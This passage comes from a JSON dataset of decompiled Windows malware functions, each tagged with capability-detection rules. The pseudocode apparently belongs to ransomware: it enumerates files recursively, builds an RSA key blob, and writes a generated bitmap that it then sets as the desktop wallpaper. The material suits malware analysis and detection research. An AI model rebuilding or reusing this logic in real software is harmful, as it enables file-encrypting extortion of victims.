        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bb89(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint extraout_ECX;\n    uint *puVar6;\n    int64_t iVar7;\n    uint var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    uint var_84h;\n    int32_t var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_74h;\n    ushort var_5ch;\n    int32_t var_5ah;\n    uint uStack90;\n    uint var_52h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    \n    fcn.00407c1d(0x4124e8, 9, 0x9bd15f6e);\n    var_ch = fcn.00402cec();\n    if (var_ch != 0) {\n        fcn.00407c1d(0x41251c, 0x10, 0xf51f70bb);\n        fcn.00402cec();\n        iVar7 = fcn.00402da4();\n        if (iVar7 != 0) {\n            puVar6 = &var_24h;\n            fcn.00407c1d(0x4122d4, 4, 0xd7d1451a, extraout_ECX);\n            fcn.00402cec();\n            fcn.00402e0b();\n            var_18h = fcn.0040a9dc(puVar6);\n            if ((var_18h != 0) && (iVar2 = (**0x4130bc)(0),  iVar2 != 0)) {\n                var_20h = iVar2;\n                var_8h = (**0x41375c)(iVar2);\n                if (var_8h != 0) {\n                    iVar3 = (**0x413760)(iVar2, 8);\n                    var_10h = (**0x413760)(iVar2, 10);\n                    var_1ch = (**0x413744)(iVar2, iVar3, var_10h);\n                    if (var_1ch != 0) {\n                        var_24h = (**0x41373c)(var_8h, var_1ch);\n                        uVar4 = (**0x413760)(iVar2, 0x5a, 0x48);\n                        fcn.00407c1d(0x4124f4, 4, 0x707f2d92, uVar4);\n                        fcn.00402cec();\n                        uVar4 = fcn.00402da4();\n                        iVar2 = (**0x413404)(uVar4);\n                        uVar4 = fcn.00407c34(0x4124fc, 8, 0x18b6feee);\n                        var_3ch = (**0x413748)(-iVar2, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 4, 0, uVar4);\n                        if (var_3ch != 0) {\n                            var_38h = (**0x41373c)(var_8h, var_3ch);\n                            fcn.00407c1d(0x412508, 10, 0x251ccd27);\n                            fcn.00402cec();\n                            uVar4 = fcn.00402da4();\n                            (**0x413730)(var_8h, uVar4);\n                            fcn.00407c1d(0x412514, 5, 0x1e4f21c0);\n                            fcn.00402cec();\n                            uVar4 = fcn.00402da4();\n                            (**0x413758)(var_8h, uVar4);\n                            var_40h = var_10h;\n                            var_34h = 0;\n                            var_30h = 0;\n                            var_28h = var_10h;\n                            var_2ch = iVar3;\n                            uVar4 = (**0x413750)(2);\n                            (**0x4130c4)(var_8h, &var_34h, uVar4);\n                            uVar1 = (var_40h * iVar3) / 10;\n                            uVar5 = var_14h;\n                            while (var_14h = uVar1,  var_14h != 0) {\n                                uVar5 = fcn.004095c4();\n                                var_10h = (uVar5 & 0xff) << 8;\n                                uVar5 = fcn.004095c4();\n                                var_10h = (uVar5 & 0xff | var_10h) << 8;\n                                uVar5 = fcn.004095c4();\n                                uVar4 = fcn.004095c4(uVar5 & 0xff | var_10h);\n                                uVar4 = fcn.004095c4(uVar4);\n                                (*str.P__._0_4_)(var_8h, uVar4);\n                                uVar5 = var_14h - 1;\n                                uVar1 = uVar5;\n                            }\n                            var_4ch = 0;\n                            var_48h = 0;\n                            var_44h = iVar3;\n                            var_14h = uVar5;\n                            (**0x4130c0)(var_8h, var_18h, 0xffffffff, &var_4ch, 0x411);\n                            var_30h = var_28h / 2 - var_40h / 2;\n                            (**0x4130c0)(var_8h, var_18h, 0xffffffff, &var_34h, 0x11);\n                            (**0x41374c)(var_1ch, 0x18, &var_9ch);\n                            puVar6 = &var_80h;\n                            for (iVar2 = 9; iVar2 != 0; iVar2 = iVar2 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            var_80h = var_98h;\n                            var_78h._0_2_ = 1;\n                            var_78h._2_2_ = 0x20;\n                            iVar2 = var_98h * 0x20 + 0x1f;\n                            iVar2 = ((iVar2 >> 0x1f & 0x1fU) + iVar2 >> 5) * var_94h * 4;\n                            var_84h = 0x28;\n                            var_7ch = var_94h;\n                            var_74h = 0;\n                            var_10h = fcn.00406c7f();\n                            if (var_10h != 0) {\n                                (**0x413740)(var_20h, var_1ch, 0, var_94h, var_10h, &var_84h, 0);\n                                fcn.00407c34(0x412530, 4, 0xf7be6bc9);\n                                var_18h = fcn.00406646();\n                                if (var_18h != 0) {\n                                    var_ch = (**0x41342c)(var_18h, 0x40000000, 1, 0, 2, 0x80, 0);\n                                    if (var_ch != -1) {\n                                        uStack90 = 0;\n                                        var_5ah = iVar2 + 0x36;\n                                        var_5ch = 0x4d42;\n                                        var_52h = 0x36;\n                                        var_14h = 0;\n                                        (**0x413498)(var_ch, &var_5ch, 0xe, &var_14h, 0);\n                                        (**0x413498)(var_ch, &var_84h, 0x28, &var_14h, 0);\n                                        (**0x413498)(var_ch, var_10h, iVar2, &var_14h, 0);\n                                        (**0x4134e8)(var_ch);\n                                        (**0x4130b8)(0x14, 0, var_18h, 3);\n                                    }\n                                    fcn.00406d25();\n                                }\n                                fcn.00406d25();\n                            }\n                            (**0x41373c)(var_8h, var_38h);\n                            (**0x413738)(var_3ch);\n                        }\n                        (**0x41373c)(var_8h, var_24h);\n                        (**0x413738)(var_1ch);\n                        iVar2 = var_20h;\n                    }\n                    (**0x413754)(var_8h);\n                }\n                (**0x4130b4)(0, iVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 2147
    },
    "0040c453": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c453(uint32_t arg_8h, int32_t arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    ulong uVar7;\n    uint var_3f8h;\n    uint var_3f4h;\n    uint auStack1012 [248];\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = *(*0x43477c + *0x434750);\n    var_ch = *(*0x43477c + 4 + *0x434750);\n    iVar5 = -1;\n    var_8h = -1;\n    sub.ntdll.dll_memset(&var_3f8h, 0, 1000);\n    var_3f8h = arg_10h;\n    var_3f4h = arg_14h;\n    iVar2 = (**0x4133a4)(&var_3f8h);\n    if (iVar2 != 4) {\n        var_8h = iVar2 * 2;\n        *(&var_3f8h + var_8h) = 0x3333;\n    }\n    iVar2 = (**0x4133a4)(&var_3f8h);\n    if (iVar2 != 4) {\n        iVar5 = iVar2 * 2;\n        *(&var_3f8h + iVar5) = 0x3333;\n    }\n    var_4h = 1;\n    arg_14h = 4;\n    uVar6 = 8;\n    do {\n        uVar7 = fcn.0040c345(uVar6 + arg_8h, arg_ch + CARRY4(uVar6, arg_8h));\n        var_4h = var_4h + 1;\n        arg_14h = arg_14h + 4;\n        *(&var_3f8h + uVar6) = uVar7;\n        *(auStack1012 + (uVar6 - 4)) = uVar7 >> 0x20;\n        uVar6 = uVar6 + 8;\n        uVar3 = (**0x4133a4)(&var_3f8h);\n        if (uVar3 < arg_14h) break;\n    } while (uVar6 < 1000);\n    if (var_4h == 0x7d) {\n        uVar4 = 0;\n    }\n    else {\n        fcn.0040c329(*0x434768, *0x434780 + (*0x434750 - *0x434788), \n                     *0x434784 + (-(*0x434750 < *0x434788) - *0x43478c) + CARRY4(*0x434780, *0x434750 - *0x434788), \n                     arg_8h, arg_ch);\n        pcVar1 = _sym.imp.USER32.dll_SetWindowTextW;\n        (*_sym.imp.USER32.dll_SetWindowTextW)(*0x434778, &var_3f8h);\n        if (iVar5 != -1) {\n            *(&var_3f8h + iVar5) = 0;\n            (*pcVar1)(*0x434778, &var_3f8h);\n        }\n        if (var_8h != -1) {\n            *(&var_3f8h + var_8h) = 0;\n            (*pcVar1)(*0x434778, &var_3f8h);\n        }\n        fcn.0040c329(*0x434768, *0x434780 + (*0x434750 - *0x434788), \n                     *0x434784 + (-(*0x434750 < *0x434788) - *0x43478c) + CARRY4(*0x434780, *0x434750 - *0x434788), \n                     var_10h, var_ch);\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 945
    },
    "0040d211": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d211(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_3f0h;\n    uint auStack1008 [249];\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = *(*0x434804 + *0x4347e0);\n    iVar6 = -1;\n    var_4h = -1;\n    sub.ntdll.dll_memset(&var_3f0h, 0, 1000);\n    var_3f0h = arg_ch;\n    iVar3 = (**0x4133a4)(&var_3f0h);\n    if (iVar3 != 2) {\n        var_4h = iVar3 * 2;\n        *(auStack1008 + var_4h + -4) = 0x3333;\n    }\n    iVar3 = (**0x4133a4)(&var_3f0h);\n    if (iVar3 != 2) {\n        iVar6 = iVar3 * 2;\n        *(auStack1008 + iVar6 + -4) = 0x3333;\n    }\n    arg_ch = 2;\n    iVar7 = 1;\n    iVar3 = arg_8h;\n    do {\n        iVar3 = iVar3 + 4;\n        uVar4 = fcn.0040d197(iVar3);\n        arg_ch = arg_ch + 2;\n        auStack1008[iVar7 + -1] = uVar4;\n        iVar7 = iVar7 + 1;\n        uVar5 = (**0x4133a4)(&var_3f0h);\n        pcVar2 = _sym.imp.USER32.dll_SetWindowLongW;\n        if (uVar5 < arg_ch) break;\n    } while (arg_ch < 500);\n    if (iVar7 == 0xfa) {\n        uVar4 = 0;\n    }\n    else {\n        (*_sym.imp.USER32.dll_SetWindowLongW)(*0x4347f4, *0x434808 + (*0x4347e0 - *0x43480c), arg_8h);\n        pcVar1 = _sym.imp.USER32.dll_SetWindowTextW;\n        (*_sym.imp.USER32.dll_SetWindowTextW)(*0x434800, &var_3f0h);\n        if (iVar6 != -1) {\n            *(auStack1008 + iVar6 + -4) = 0;\n            (*pcVar1)(*0x434800, &var_3f0h);\n        }\n        if (var_4h != -1) {\n            *(auStack1008 + var_4h + -4) = 0;\n            (*pcVar1)(*0x434800, &var_3f0h);\n        }\n        (*pcVar2)(*0x4347f4, *0x434808 + (*0x4347e0 - *0x43480c), var_8h);\n        (*_sym.imp.USER32.dll_ShowWindow)(*0x434800, 5);\n        (*_sym.imp.USER32.dll_UpdateWindow)(*0x434800);\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 755
    },
    "0040ddfd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ddfd(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *unaff_EDI;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.0040ddca(arg_8h);\n    if (var_4h != 0) {\n        iVar1 = (**0x41342c)(var_4h, 0x40000000, 0, 0, 1, 0x2080, 0);\n        if (iVar1 != -1) {\n            (**0x413498)(iVar1, *unaff_EDI, unaff_EDI[1], &var_8h, 0);\n            (**0x4134e8)(iVar1);\n        }\n        fcn.00406d25();\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "0040e6d3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040e6d3(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_d30h;\n    uint var_b28h;\n    uint var_920h;\n    uint var_8f4h;\n    uint var_6d0h;\n    uint var_4c8h;\n    uint var_4c2h;\n    uint var_2c0h;\n    uint var_ach;\n    uint var_8h;\n    uint var_4h;\n    \n    (**0x413270)(0);\n    (**0x4133f8)(&var_4c8h, 0x104);\n    (**0x41320c)(&var_4c8h, 0, &var_2c0h, 0x2b4, 0x400);\n    iVar1 = (**0x4133a4)(&var_ach);\n    var_4h = fcn.0040fdc1(iVar1 * 2);\n    var_4c2h._0_2_ = 0;\n    (**0x41320c)(&var_4c8h, 0, &var_2c0h, 0x2b4, 0x400);\n    iVar1 = (**0x4133a4)(&var_ach);\n    var_8h = fcn.0040fdc1(iVar1 * 2);\n    (**0x413204)(0, 8, 0, 0, &var_6d0h);\n    puVar4 = &var_6d0h;\n    uVar2 = fcn.00407c34(0x412634, 8, 0x95737af9);\n    fcn.00407d76(&var_d30h, uVar2, puVar4);\n    iVar1 = (**0x413408)(&var_d30h, &var_920h);\n    if (iVar1 != -1) {\n        do {\n            puVar4 = &var_6d0h;\n            uVar2 = fcn.00407c34(0x412128, 5, 0x868d95fd, puVar4, &var_8f4h);\n            fcn.00407d76(&var_b28h, uVar2, puVar4);\n            iVar3 = fcn.0040e5aa(&var_b28h, var_4h, var_8h);\n            if (iVar3 != 0) {\n                uVar2 = (**0x4133a4)(iVar3);\n                (**0x4130b0)(iVar3, uVar2);\n                fcn.0040e54a(iVar3);\n                fcn.00406d25();\n            }\n            iVar3 = (**0x41340c)(iVar1, &var_920h);\n        } while (iVar3 != 0);\n        (**0x413410)(iVar1);\n    }\n    return;\n}\n",
        "token_count": 678
    },
    "0040f27c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f27c(int32_t arg_8h, uint arg_ch, code *arg_10h, char *arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint var_868h;\n    uint var_468h;\n    uint32_t var_260h;\n    int32_t var_244h;\n    uint32_t var_240h;\n    uint var_234h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        uVar4 = (**0x413428)(arg_ch);\n        (**0x4134d8)(arg_ch, uVar4 | 0x2000);\n        fcn.00407c34(0x4126f4, 1, 0xf4c88e4c);\n        cVar1 = fcn.00409573(&var_468h, arg_ch);\n        if (cVar1 == '\\0') {\n            return;\n        }\n    }\n    else {\n        iVar2 = fcn.0040e1fc(arg_8h, 0);\n        if (iVar2 == 0) {\n            return;\n        }\n        uVar3 = fcn.00407c34(0x41261c, 5, 0xa5744f50, iVar2, arg_ch);\n        (**0x413088)(&var_468h, uVar3);\n        fcn.00406d25();\n        uVar4 = (**0x413428)(&var_468h);\n        if ((uVar4 & 2) != 0) {\n            return;\n        }\n        var_4h = 0x400;\n        iVar2 = (**0x413818)(&var_468h, 1, &var_868h, 0x400, &var_4h);\n        if (((iVar2 != 0) && (iVar2 = (**0x413814)(&var_868h, &var_8h, &var_ch),  iVar2 != 0)) &&\n           (iVar2 = (*str.ec:_._0_4_)(0x433870, var_8h),  iVar2 != 0)) {\n            return;\n        }\n        *(arg_8h + 5) = 1;\n        uVar4 = (**0x413428)(&var_468h);\n        (**0x4134d8)(&var_468h, uVar4 | 0x2000);\n        (**0x4133a0)(&var_468h, 0x4126f0);\n    }\n    if ((arg_14h[1] == '\\0') && (cVar1 = fcn.0040e35c(&var_468h),  cVar1 != '\\0')) {\n        return;\n    }\n    var_4h = (**0x413408)(&var_468h, &var_260h);\n    if (var_4h != -1) {\n        iVar2 = 0;\n        do {\n            iVar5 = (**0x4134ac)(*0x433620, 0);\n            if (iVar5 == 0) break;\n            cVar1 = fcn.0040959f();\n            if ((cVar1 == '\\0') && ((var_260h & 0x400) == 0)) {\n                if (iVar2 == 0) {\n                    (**0x4133a4)(arg_ch, arg_14h);\n                    iVar2 = fcn.0040f0bd(arg_8h, arg_ch);\n                    if (iVar2 == 0) break;\n                }\n                uVar3 = (**0x4133a4)(&var_234h);\n                (**0x4130b0)(&var_234h, uVar3);\n                if ((var_260h & 0x10) == 0) {\n                    if ((((*0x433594 <= var_244h) && ((*0x433594 < var_244h || (*0x433590 <= var_240h)))) &&\n                        ((*arg_14h == '\\0' || (iVar5 = (**0x413150)(&var_234h, 0x2e),  iVar5 != 0)))) &&\n                       (iVar5 = (*arg_10h)(iVar2, &var_260h, arg_14h),  iVar5 == 0)) break;\n                }\n                else {\n                    (**0x41347c)(1);\n                    fcn.0040f27c(iVar2, &var_234h, arg_10h, arg_14h);\n                }\n            }\n            iVar5 = (**0x41340c)(var_4h, &var_260h);\n        } while (iVar5 != 0);\n        (**0x413410)(var_4h);\n    }\n    return;\n}\n",
        "token_count": 1096
    },
    "004102fd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004102fd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint arg_8h_01;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    arg_8h_00 = fcn.0040384a();\n    arg_8h_01 = fcn.0040384a();\n    uVar2 = fcn.0040384a();\n    iVar3 = fcn.004065a7(arg_8h_00, arg_8h);\n    if ((iVar3 != -1) && (iVar3 = fcn.004065a7(arg_8h_01, arg_8h),  iVar3 != -1)) {\n        iVar3 = fcn.004039d3();\n        if (iVar3 < 1) {\n            fcn.0040384a();\n            fcn.004039e4();\n            fcn.004039e4();\n            fcn.004039e4();\n            fcn.00403871();\n        }\n        fcn.00403aad(arg_8h_00, arg_8h_01);\n        iVar3 = fcn.0040392d(0, 0);\n        puVar4 = fcn.00406c7f();\n        if (puVar4 != NULL) {\n            *puVar4 = 0;\n            puVar4[1] = 0;\n            *puVar4 = 0x206;\n            puVar4[1] = 0xa400;\n            puVar4[2] = 0x31415352;\n            uVar5 = fcn.00403988();\n            puVar4[3] = uVar5;\n            puVar4[4] = 0x10001;\n            fcn.0040ffa1(uVar2, 1);\n            cVar1 = fcn.0041026d(arg_8h_00, arg_8h_01, arg_ch, arg_10h);\n            if (cVar1 == '\\0') {\n                fcn.00406d6b();\n            }\n            else {\n                var_1h._0_1_ = 1;\n                *0x433dcc = iVar3 + 0x14;\n                *0x433dd4 = puVar4;\n            }\n        }\n    }\n    fcn.00403871();\n    fcn.00403871();\n    uVar6 = fcn.00403871();\n    return uVar6 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 664
    },
    "004105d4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004105d4(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iStack12;\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((*(param_1 + 4) & 6) == 0) {\n        iStack12 = param_1;\n        uStack8 = param_3;\n        *(param_2 + -4) = &iStack12;\n        iVar5 = *(param_2 + 0xc);\n        iVar3 = *(param_2 + 8);\n        iVar2 = fcn.00410805(param_2);\n        if (iVar2 == 0) {\n            *(param_1 + 4) = *(param_1 + 4) | 8;\n        }\n        else {\n            for (; iVar5 != -1; iVar5 = *(iVar3 + iVar5 * 0xc)) {\n                pcVar1 = *(iVar3 + 4 + iVar5 * 0xc);\n                if (pcVar1 != NULL) {\n                    iVar3 = (*pcVar1)();\n                    param_2 = *(puVar4 + 0xc);\n                    if (iVar3 != 0) {\n                        if (iVar3 < 0) {\n                            return 0;\n                        }\n                        iVar3 = *(param_2 + 8);\n                        fcn.004106f0(param_2);\n                        puVar4 = param_2 + 0x10;\n                        fcn.0041074b(param_2, iVar5);\n                        fcn.004107e7(1);\n                        *(param_2 + 0xc) = *(iVar3 + extraout_ECX * 4);\n                        param_2 = 0;\n                        iVar5 = 0;\n                        (**(iVar3 + 8 + extraout_ECX * 4))();\n                    }\n                }\n                iVar3 = *(param_2 + 8);\n            }\n        }\n    }\n    else {\n        fcn.0041074b(param_2, 0xffffffff, &stack0xfffffffc, &stack0xfffffffc);\n    }\n    return 1;\n}\n",
        "token_count": 512
    },
    "0041074b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0041074b(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    int32_t iStack20;\n    \n    iStack20 = param_1;\n    uStack28 = 0x410710;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    while( true ) {\n        iVar1 = *(param_1 + 8);\n        uVar2 = *(param_1 + 0xc);\n        if ((uVar2 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar2 <= param_2)))) break;\n        uStack24 = *(iVar1 + uVar2 * 0xc);\n        *(param_1 + 0xc) = uStack24;\n        if (*(iVar1 + 4 + uVar2 * 0xc) == 0) {\n            fcn.004107e7(0x101);\n            (**(iVar1 + 8 + uVar2 * 0xc))();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 281
    },
    "00410805": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00410805(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t in_FS_OFFSET;\n    uint var_20h;\n    int16_t *var_1ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t *var_4h;\n    \n    puVar3 = arg_8h;\n    puVar8 = arg_8h[2];\n    if ((puVar8 & 3) != 0) {\n        return 0;\n    }\n    var_4h = *(in_FS_OFFSET + 8);\n    if ((var_4h <= puVar8) && (puVar8 < *(in_FS_OFFSET + 4))) {\n        return 0;\n    }\n    puVar1 = arg_8h + 3;\n    if (*puVar1 == 0xffffffff) {\n        return 1;\n    }\n    uVar10 = 0;\n    arg_8h = NULL;\n    puVar4 = puVar8;\n    do {\n        if ((*puVar4 != 0xffffffff) && (uVar10 <= *puVar4)) {\n            return 0;\n        }\n        if (puVar4[1] != 0) {\n            arg_8h = arg_8h + 1;\n        }\n        uVar10 = uVar10 + 1;\n        puVar4 = puVar4 + 3;\n    } while (uVar10 <= *puVar1);\n    if ((arg_8h != NULL) && ((puVar1 = puVar3[-2],  puVar1 < var_4h || (puVar3 <= puVar1)))) {\n        return 0;\n    }\n    uVar10 = puVar8 & 0xfffff000;\n    iVar5 = 0;\n    if (0 < *0x434bf0) {\n        do {\n            if (*(iVar5 * 4 + 0x434bf8) == uVar10) {\n                if (iVar5 < 1) {\n                    return 1;\n                }\n                if (*0x434c38 != 0) {\n                    *0x434c38 = 1;\n                    return 1;\n                }\n                if (*(iVar5 * 4 + 0x434bf8) == uVar10) goto code_r0x0041091a;\n                iVar5 = *0x434bf0 + -1;\n                if (-1 < iVar5) goto code_r0x004108f7;\n                goto code_r0x00410907;\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < *0x434bf0);\n    }\n    iVar6 = sub.ntdll.dll_NtQueryVirtualMemory(0xffffffff, puVar8, 0, &var_20h, 0x1c, &arg_8h);\n    iVar5 = *0x434bf0;\n    if (iVar6 < 0) {\n        arg_8h = NULL;\n    }\n    if (arg_8h == NULL) {\n        return 0xffffffff;\n    }\n    if (var_8h != 0x1000000) {\n        return 0xffffffff;\n    }\n    if ((var_ch & 0xcc) != 0) {\n        if (((*var_1ch != 0x5a4d) || (piVar7 = *(var_1ch + 0x1e) + var_1ch,  *piVar7 != 0x4550)) ||\n           (*(piVar7 + 6) != 0x10b)) {\n            return 0xffffffff;\n        }\n        uVar9 = *(piVar7 + 5);\n        if (*(piVar7 + 6) == 0) {\n            return 0xffffffff;\n        }\n        uVar2 = *(piVar7 + uVar9 + 0x24);\n        if (((uVar2 <= puVar8 - var_1ch) && (puVar8 - var_1ch < *(piVar7 + uVar9 + 0x20) + uVar2)) &&\n           ((*(piVar7 + uVar9 + 0x3f) & 0x80) != 0)) {\n            return 0;\n        }\n    }\n    if (*0x434c38 != 0) {\n        *0x434c38 = 1;\n        return 1;\n    }\n    iVar6 = *0x434bf0;\n    if (0 < *0x434bf0) {\n        puVar8 = *0x434bf0 * 4 + 0x434bf4;\n        do {\n            if (*puVar8 == uVar10) break;\n            iVar6 = iVar6 + -1;\n            puVar8 = puVar8 + -1;\n        } while (0 < iVar6);\n    }\n    if (iVar6 == 0) {\n        iVar6 = 0xf;\n        if (*0x434bf0 < 0x10) {\n            iVar6 = *0x434bf0;\n        }\n        iVar11 = 0;\n        if (-1 < iVar6) {\n            do {\n                puVar8 = iVar11 * 4 + 0x434bf8;\n                uVar9 = *puVar8;\n                iVar11 = iVar11 + 1;\n                *puVar8 = uVar10;\n                uVar10 = uVar9;\n            } while (iVar11 <= iVar6);\n        }\n        if (iVar5 < 0x10) {\n            *0x434bf0 = iVar5 + 1;\n        }\n    }\n    *0x434c38 = 0;\n    return 1;\n    while (iVar5 = iVar5 + -1,  -1 < iVar5) {\ncode_r0x004108f7:\n        if (*(iVar5 * 4 + 0x434bf8) == uVar10) break;\n    }\n    if (iVar5 < 0) {\ncode_r0x00410907:\n        if (*0x434bf0 < 0x10) {\n            *0x434bf0 = *0x434bf0 + 1;\n        }\n        iVar5 = *0x434bf0 + -1;\n    }\n    else if (iVar5 == 0) {\n        *0x434c38 = 0;\n        return 1;\n    }\ncode_r0x0041091a:\n    iVar6 = 0;\n    if (-1 < iVar5) {\n        do {\n            puVar8 = iVar6 * 4 + 0x434bf8;\n            uVar9 = *puVar8;\n            iVar6 = iVar6 + 1;\n            *puVar8 = uVar10;\n            uVar10 = uVar9;\n        } while (iVar6 <= iVar5);\n    }\n    *0x434c38 = 0;\n    return 1;\n}\n",
        "token_count": 1598
    },
    "004017d3": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint * fcn.004017d3(void)\n\n{\n    uint *puVar1;\n    int32_t unaff_EDI;\n    \n    (**0x4133e8)(unaff_EDI + 4);\n    do {\n        puVar1 = *(unaff_EDI + 0x1c);\n        if (puVar1 == NULL) break;\n        *(unaff_EDI + 0x1c) = *puVar1;\n    } while (*(puVar1[1] + 4) != '\\0');\n    (**0x4133f0)(unaff_EDI + 4);\n    return puVar1;\n}\n",
        "token_count": 139
    },
    "0040210f": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040210f(uint param_1)\n\n{\n    if (*0x433dc8 != 0) {\n        fcn.00402001(param_1);\n        fcn.00406d6b();\n        *0x433dc8 = 0;\n    }\n    if (*0x433dcc != 0) {\n        fcn.0040201c();\n        fcn.00406d6b();\n        *0x433dcc = 0;\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00402699": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
